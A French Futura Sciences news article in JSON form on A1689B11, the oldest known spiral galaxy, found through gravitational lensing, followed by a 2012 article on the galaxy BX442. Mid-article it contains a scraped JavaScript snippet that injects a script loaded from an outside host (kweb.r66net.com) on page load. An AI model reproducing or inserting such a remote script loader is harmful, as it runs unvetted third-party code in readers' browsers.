{"title": "La plus ancienne galaxie spirale jamais découverte", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "08/11/2017", "content": "La plus ancienne galaxie spirale connue à ce jour a été débusquée à l'aide d'une lentille gravitationnelle. Les astronomes l'ont vue telle qu'elle était il y a... 11 milliards d'années ! Son étude devrait aider à comprendre comment sont nées les galaxies, à partir notamment de fusions chaotiques de galaxies naines. Ce qu'il faut retenir Des télescopes comme Hubble ont montré que les galaxies spirales étaient de plus en plus rares en remontant dans le passé mais que le nombre de galaxies irrégulières de petite taille augmentait. Ces observations s'expliquent en postulant que les premières galaxies étaient naines et qu'elles entraient fréquemment en collision en fusionnant. Beaucoup plus régulières, les galaxies spirales seraient le produit de ces fusions, mais, pour comprendre vraiment comment s'est effectué le passage de la première étape à la suivante, les astronomes cherchent à observer les galaxies spirales les plus jeunes. Le record vient d'être battu par une galaxie spirale vue comme elle était il y a 11 milliards d'années. Les cosmologistes et les astrophysiciens continuent d'explorer le monde des nébuleuses, ouvert il y a presque un siècle par  Edwin Hubble . Il ne s'agit pas simplement d'une question de géographie, mais aussi d'histoire, de notre histoire, puisque le Soleil est membre d'une de ces nébuleuses, une  galaxie spirale  barrée connue de l'humanité sous le nom de  Voie lactée . La cosmogonie est donc une branche de la généalogie de l'Homme. C'est pour cela que ce dernier cherche à comprendre d'où viennent les galaxies, en particulier les  galaxies spirales , qui constituent presque les deux tiers des galaxies dans l' univers  actuel. Celles-ci ont évolué durant des milliards d'années et, comme toutes leurs cousines, elles sont considérées comme un gaz autogravitant d' étoiles . Toutefois, il ne s'agit pas exactement d'un gaz. En effet, les forces entre étoiles sont de longue portée et décroissent lentement avec la distance, ce qui n'est pas le cas dans un vrai gaz. De plus, dans ce dernier, l'effet des collisions entre les molécules et les atomes est en général important. En fait, le fluide d'étoiles des galaxies se comporte plutôt comme un plasma, tel celui qui devrait être produit dans Iter. En termes techniques, sa description fait appel à l'équation de Vlasov plutôt qu'à celle de Boltzmann, comme le rappelle  André Brahic  dans ses leçons d'astronomie. Une vue d'artiste d'un amas de galaxies à l'origine d'un effet de lentille gravitationnelle révélant au regard du télescope Gemini Nord la plus ancienne galaxie spirale connue à ce jour. © James Josephides                               La genèse des galaxies spirales Les observations et cette équation, que la gravitation gouverne, nous permettent de construire un scénario dans lequel de petites  galaxies naines  sont nées quelques centaines de millions d'années après le  Big Bang  et sont ensuite entrées en collision pour, parfois, fusionner en donnant des galaxies de plus en plus grosses, qui ont absorbé à leur tour d'autres galaxies naines.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les premières galaxies sont souvent d'aspect irrégulier quand elles sont observées et des flambées d'étoiles en formation y sont monnaie courante. Les chercheurs ont été surpris de voir que des grandes galaxies spirales, qui croissent aussi en accrétant du gaz provenant de gigantesques courants d'hydrogène et d'hélium froid, se soient formées très rapidement. Ils cherchent à en comprendre les raisons en profondeur, notamment en poussant les instruments à leurs limites, pour voir toujours plus loin, et donc toujours plus tôt. L'objectif est de comprendre les processus qui font passer des petites galaxies chaotiques et turbulentes en collision aux disques calmes et majestueux telles la galaxie d'Andromède ou la galaxie du Moulinet. Une présentation des télescopes Gemini. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». ©  Gemini Observatory A1689B11, une galaxie sujette à un effet de lentille gravitationnelle Une équipe internationale d'astronomes vient justement d'annoncer  via  un article sur  arXiv  qu'elle avait découvert la galaxie spirale la plus ancienne connue à ce jour, observée telle qu'elle était il y a 11 milliards d'années. Pour accomplir cet exploit, il a fallu utiliser le  Near-Infrared Integral Field Spectrograph  équipant le télescope Gemini Nord, à Hawaï. Mais l'observation de A1689B11 n'aurait pas été possible sans un coup de pouce de la nature. La galaxie spirale est en effet sujette à un effet de lentille gravitationnelle produit par un  amas de galaxies  qui s'interpose entre A1689B11 et la  Voie lactée . C'est cet effet de grossissement qui a permis d'observer la jeune spirale alors que l'univers observable avait environ 2,7 milliards d'années et qu'elle formait des étoiles 20 fois plus rapidement que les galaxies spirales les plus proches de nous observées actuellement. On devrait en apprendre bien plus sur l'origine et l'évolution des galaxies dans quelques années grâce au lancement du télescope spatial  James Webb . Pour en savoir plus  BX442, la grande galaxie spirale qui ne devrait pas exister Article de Laurent Sacco publié le 25/07/2012 Une grande galaxie spirale observée par les  télescopes Hubble  et  Keck  rend quelque peu perplexes les astrophysiciens. Âgée de presque 11 milliards d'années, une telle galaxie ne devrait être apparue que des milliards d'années plus tard dans l'histoire du cosmos observable. Visiblement, il nous manque encore des pièces du puzzle de la formation et de l'évolution des galaxies. Un groupe d'astrophysiciens vient de publier dans  Nature   un article sur la découverte par Hubble de la galaxie BX442. C'est une grande  galaxie spirale , comme il en existe de nos jours tout autour de la Voie lactée. La plus célèbre, outre notre Galaxie qui est aussi une spirale, est sans aucun doute celle d' Andromède . De prime abord, BX442 ne semble rien avoir de particulier. Elle n'est pas même la galaxie la plus lointaine connue, dont le record de distance semble être détenu, jusqu'à présent, par  SXDF-NB1006-2 . Il est représenté ici une vraie image de la grande galaxie spirale BX442 telle qu'elle était il y a 10,7 milliards d'années. Elle a été composée à partir d'observations faites par Hubble et le télescope Keck à Hawaï. © David Law,  Dunlap Institute for Astronomy & Astrophysics                               Alors, pourquoi la découverte de cette grande galaxie spirale fait-elle parler d'elle ? Pour le comprendre, il faut savoir que d'après la théorie de la  matière noire  froide, les galaxies sont les premières structures apparues dans l'univers. Naines pour la plupart, elles ont ensuite fusionné et se sont assemblé pour constituer des amas de galaxies, lesquels se sont regroupés, aboutissant à la structure filamenteuse ponctuée de vides immenses que l'on observe actuellement. Les simulations basées sur ce scénario, comme  Deus  qui fait intervenir l' énergie noire , fonctionnent remarquablement bien, même s'il reste encore quelques désaccords avec les observations. En particulier, on ne comprend pas toujours comment de grandes galaxies ont pu se former très tôt dans l'histoire du cosmos, même si des explications sont plausibles, comme la théorie des  courants froids . La découverte de BX442 entre précisément dans ce cas de figure. Au départ, les astronomes avaient débusqué cette galaxie spirale dans un échantillon de 300 galaxies très lointaines présentes sur des images prises par Hubble. Les mesures indiquaient que l'on voyait BX442 telle qu'elle était voici environ 10,7 milliards d'années. Il n'est pas question ici d'image réelle de la galaxie spirale BX442. En effet, l'image brute, reconstruite à partir des observations d'Hubble et du Keck, est plus grossière. Mais elle a permis à un artiste de reconstituer ce que l'on verrait probablement si l'on était beaucoup plus proche de cet astre. © Joe Bergeron,  Dunlap Institute for Astronomy & Astrophysics                       BX442, une vraie galaxie spirale en rotation Or, d'après la théorie et les observations faites jusqu'à présent, il ne s'est pas encore écoulé suffisamment de temps à cette époque pour que l'immense majorité de l'univers observable, né il y a 13,7 milliards d'années, ne soit pas constituée essentiellement de petites  galaxies irrégulières , croissant par des captures successives de  galaxies naines . De grandes galaxies, et encore plus avec des structures régulières, comme celles des spirales et elliptiques qui sont communes depuis quelques milliards d'années dans l'univers observable, devaient être rares. BX442 dérange donc clairement les modèles en vigueur. Tellement, d'ailleurs, que les astrophysiciens ont tout de suite pensé à une illusion d'optique causée par deux images d'objets galactiques superposés. Étant donnée la distance, les observations ne montrent pas une image aussi nette que celles des somptueuses galaxies observées par  Hubble , que l'on est habitué à voir. Pour en avoir le cœur net, les astrophysiciens ont entrepris d'utiliser les instruments plus performants du télescope Keck au sol, pour les mesures spectroscopiques. Ces mesures sont essentielles pour affiner les distances et les  vitesses  de rotation des étoiles présentes dans une  galaxie . Avec le  spectrographe   Osiris , les chercheurs ont étudié les  spectres  de 3.600 régions des images associées à BX442. Il a fallu se rendre à l'évidence. Ils étaient bien en présence d'une seule grande galaxie spirale en rotation, déjà bien formée et massive tôt dans l'histoire du cosmos observable. Elle reste quand même une exception, ce qui veut dire qu'elle ne remet nullement en cause l'âge de l'univers et encore moins la théorie du  Big Bang . ", "theme": "sciences"}